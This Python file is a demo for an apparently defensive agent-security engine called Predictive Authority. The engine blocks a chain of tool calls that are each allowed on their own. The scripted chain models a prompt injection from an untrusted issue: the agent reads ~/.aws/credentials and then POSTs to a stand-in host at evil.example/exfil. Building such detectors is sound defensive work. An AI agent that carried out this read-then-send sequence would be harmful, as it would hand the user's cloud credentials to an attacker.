"""Executable demo: individually legitimate actions, dangerous trajectory."""

from __future__ import annotations

import json
from typing import Any

from ..models import Action, Decision
from .config import PredictiveAuthorityConfig
from .engine import PredictiveAuthorityEngine
from .registry import reset_authority_registry


def run_predictive_demo(*, json_out: bool = False) -> int:
    """Print a conference-ready demonstration of Predictive Authority."""
    reset_authority_registry()
    cfg = PredictiveAuthorityConfig(enabled=True, mode="enforce", max_depth=4)
    engine = PredictiveAuthorityEngine(cfg)

    steps: list[tuple[str, Action]] = [
        (
            "untrusted issue content enters context",
            Action(
                type="tool_call",
                tool="ingest_issue",
                metadata={
                    "provenance_sources": [
                        {
                            "source_id": "issue-42",
                            "type": "chat_message",
                            "trust_level": "untrusted",
                        }
                    ]
                },
                classifiers={"provenance_untrusted": True},
                trace_id="pa-demo",
                tenant_id="demo",
            ),
        ),
        (
            "read repository config",
            Action(
                type="filesystem_read",
                tool="open",
                args={"args": ["README.md", "r"]},
                metadata={"provenance_sources": [{"source_id": "issue-42", "type": "chat_message", "trust_level": "untrusted"}]},
                trace_id="pa-demo",
                tenant_id="demo",
            ),
        ),
        (
            "read credential-bearing file",
            Action(
                type="filesystem_read",
                tool="open",
                args={"args": ["~/.aws/credentials", "r"]},
                metadata={"provenance_sources": [{"source_id": "issue-42", "type": "chat_message", "trust_level": "untrusted"}]},
                trace_id="pa-demo",
                tenant_id="demo",
            ),
        ),
        (
            "external HTTP POST",
            Action(
                type="http_request",
                tool="requests.post",
                method="POST",
                url="https://evil.example/exfil",
                domain="evil.example",
                metadata={"provenance_sources": [{"source_id": "issue-42", "type": "chat_message", "trust_level": "untrusted"}]},
                trace_id="pa-demo",
                tenant_id="demo",
            ),
        ),
    ]

    without: list[dict[str, Any]] = []
    with_pa: list[dict[str, Any]] = []

    # WITHOUT predictive reasoning: each action independently allowed.
    for label, action in steps:
        without.append({"step": label, "decision": "ALLOW"})

    # WITH Predictive Authority.
    for label, action in steps:
        existing = Decision(action="allow", reason="no matching rule", effective_action="allow")
        final, result = engine.evaluate(action, existing, policy={})
        with_pa.append(
            {
                "step": label,
                "existing": "ALLOW",
                "predictive": (result.recommendation.action if result.recommendation else "allow").upper(),
                "final": final.action.upper(),
                "hazardous": [f.path.to_dict()["display"] for f in result.findings],
                "explanation": result.explanation.render() if result.explanation and final.action != "allow" else None,
            }
        )

    payload = {
        "title": "predictive_authority_demo",
        "without_predictive_reasoning": without,
        "with_predictive_authority": with_pa,
        "summary": (
            "Individually legitimate reads and an HTTP call become a hazardous "
            "untrusted → credential → external_sink trajectory under Predictive Authority."
        ),
    }

    if json_out:
        print(json.dumps(payload, indent=2))
        return 0

    print("=" * 72)
    print("VARDEN PREDICTIVE AUTHORITY DEMO")
    print("=" * 72)
    print()
    print("WITHOUT predictive reasoning:")
    for row in without:
        print(f"  {row['step']:40} -> {row['decision']}")
    print()
    print("WITH Predictive Authority (enforce):")
    for row in with_pa:
        print(f"  {row['step']:40} -> existing ALLOW | predictive {row['predictive']} | final {row['final']}")
        if row["hazardous"]:
            print(f"      path: {row['hazardous'][0]}")
    print()
    # Show last non-allow explanation.
    for row in reversed(with_pa):
        if row.get("explanation"):
            print(row["explanation"])
            break
    print(payload["summary"])
    print()
    return 0
